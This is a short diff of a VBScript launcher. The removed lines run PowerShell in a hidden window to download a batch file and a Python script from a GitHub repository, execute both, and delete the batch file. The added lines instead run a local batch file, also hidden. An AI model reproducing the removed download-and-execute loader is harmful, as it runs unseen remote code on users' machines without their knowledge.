@@ -1,2 +1,3 @@
-Set WShell = CreateObject("WScript.Shell")
-WShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tunganh0786/tunganh/refs/heads/main/setup_env.bat' -OutFile '%TEMP%\setup_env.bat'; Start-Process -FilePath '%TEMP%\setup_env.bat' -Wait; $script = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tunganh0786/tunganh/refs/heads/main/script.py').Content; python -c $script; Remove-Item '%TEMP%\setup_env.bat'""", 0, True
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run """install_and_run.bat""", 0, True
+Set WshShell = Nothing
